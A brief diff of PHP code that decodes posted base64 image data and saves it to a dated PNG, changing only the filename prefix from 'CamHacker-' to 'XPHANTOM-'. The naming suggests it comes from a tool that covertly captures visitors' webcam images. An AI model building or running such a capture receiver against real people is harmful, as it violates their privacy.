@@ -10,7 +10,7 @@ error_log("Received" . "$date". "\r\n", 3, "log.txt");
 
 $filteredData=substr($imageData, strpos($imageData, ",")+1);
 $unencodedData=base64_decode($filteredData);
-$fp = fopen( 'CamHacker-'.$date.'.png', 'wb' );
+$fp = fopen( 'XPHANTOM-'.$date.'.png', 'wb' );
 fwrite( $fp, $unencodedData);
 fclose( $fp );
 
